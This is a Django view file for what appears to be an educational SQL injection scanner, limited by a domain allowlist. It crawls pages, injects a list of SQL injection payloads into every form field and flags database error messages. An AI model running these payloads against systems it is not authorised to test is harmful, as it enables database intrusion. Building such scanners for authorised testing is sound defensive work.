from django.shortcuts import render
from django.conf import settings
from scannigapp.forms import UserForm
from bs4 import BeautifulSoup
from urllib.parse import urlparse,urljoin
import requests

PAYLOADS = [
    "'", '"', 
    "' OR '1'='1", 
    '" OR "1"="1',
    "' OR '1'='1' --",
    '" OR "1"="1" --',
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND SLEEP(5)--",      # MySQL time-based
    "' AND '1'='1",
    "' AND '1'='2",
    "admin' --",
    "'; WAITFOR DELAY '0:0:5'--", # MSSQL time delay
    "') OR ('1'='1",
    "') OR ('1'='2",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "'||(SELECT '')||'",
    "' AND 1=CAST((SELECT CURRENT_USER) AS INT)--"
]
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sql syntax",
    "mysql_fetch",
    "syntax error",
    "sqlite error",
    "pg::syntaxerror"
]
def is_DomainAllowed(url):
    try:
        host = urlparse(url).hostname
        if host:
            return host in settings.ALLOWED_SCAN_DOMAINS
        return False
    except Exception as e:
        print(f"Error parsing URL: {e}")
        return False
def get_forms(html, base_url):
    soup = BeautifulSoup(html, 'html.parser')
    forms = []
    for form in soup.find_all("form"):
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get").lower()
        inputs=[]
        for i in form.find_all(["input", "textarea", "select"]):
            type = i.attrs.get("type", "text")
            name=i.attrs.get("name")
            value=i.attrs.get("value", "")
            inputs.append({"type": type,"name": name,"value": value} )
        forms.append({"action":urljoin(base_url,action),"method":method,"inputs":inputs})
    return forms    
def data_payload(inputs,payload):
    data={}
    for inp in inputs:
        if not inp["name"]:
            continue
        if inp["type"]!="submit":
              data[inp["name"]] = f"test{payload}"
    return data
def detect_vulnb(txt):
    if not txt:
        return False
    txt = txt.lower()
    return any(error in txt for error in SQL_ERRORS)
# Create your views here.
def scaningform(request):
    results = None
    if request.method == "POST":
        myform = UserForm(request.POST)
        if myform.is_valid():
            url = myform.cleaned_data["url"]
            crawl = myform.cleaned_data["crawl"]
            max_pages = myform.cleaned_data["max_pages"]
            if not is_DomainAllowed(url):
                myform.add_error("url", "This domain is not allowed for scanning.")
            else:
                session = requests.Session()
                # session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
                session.headers["User-Agent"] = "SafeEducationalScanner/1.0"
                pages_to_scan = [url]
                visited = set()
                scan_results = []
                while pages_to_scan and len(visited) < max_pages:
                     page_url = pages_to_scan.pop(0)
                     if page_url in visited:
                         continue
                     try:
                         resp=session.get(page_url,timeout=5)
                     except :
                        continue
                     visited.add(page_url)
                     forms = get_forms(resp.text, page_url)
                     for form_def in forms:
                           for payload in PAYLOADS:
                               data = data_payload(form_def["inputs"],payload)
                               try:
                                   if form_def["method"] == "post":
                                        r = session.post(form_def["action"], data=data, timeout=5)
                                   else:
                                       r = session.get(form_def["action"],params=data,timeout=5)
                                   vuln = detect_vulnb(r.text)
                               except:
                                vuln = False
                               scan_results.append({
                                "page": page_url,
                                "action": form_def["action"],
                                "method": form_def["method"].upper(),
                                "payload": payload,
                                "vulnerable": vuln
                            })
                     if crawl:
                         soup = BeautifulSoup(resp.text, "html.parser")
                         for a in soup.find_all("a", href=True):
                            link = urljoin(page_url, a["href"])
                            host = urlparse(link).hostname
                            if host in settings.ALLOWED_SCAN_DOMAINS and link not in visited and link not in pages_to_scan:
                                    pages_to_scan.append(link)

                results = scan_results
               
    else:
        myform = UserForm()                            
    return render(request,"scanerform.html",{"form":myform,"results": results})
